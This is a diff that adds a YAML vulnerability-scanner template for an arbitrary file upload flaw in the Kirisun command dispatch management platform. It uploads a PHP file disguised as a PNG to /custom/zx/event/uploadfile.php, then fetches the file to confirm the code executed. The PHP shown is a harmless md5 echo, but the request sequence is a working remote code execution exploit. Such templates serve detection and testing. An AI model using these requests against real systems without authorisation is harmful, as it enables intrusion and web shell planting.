@@ -1,0 +1,66 @@
+id: poc-yaml-kirisun-event-uploadfile-upload
+
+info:
+  name: 福建科立讯通信 指挥调度管理平台 event/uploadfile任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /custom/zx/event/uploadfile.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySwvD8hSn3Z0sHfMu
+
+        ------WebKitFormBoundarySwvD8hSn3Z0sHfMu
+        Content-Disposition: form-data; name="uuid"
+        
+        1
+        ------WebKitFormBoundarySwvD8hSn3Z0sHfMu
+        Content-Disposition: form-data; name="number"
+        
+        200
+        ------WebKitFormBoundarySwvD8hSn3Z0sHfMu
+        Content-Disposition: form-data; name="uploadfile"; filename="d.php"
+        Content-Type: image/png
+        
+        <?php echo md5({{t1}}); ?>
+        ------WebKitFormBoundarySwvD8hSn3Z0sHfMu--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "successed"
+          - "\"url\""
+    extractors:
+      - type: regex
+        name: name
+        internal: true
+        group: 1
+        regex:
+          - "upload\\/event\\/(?P<name>.*?).php"
+
+  - raw:
+      - |
+        GET /upload/event/{{name}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
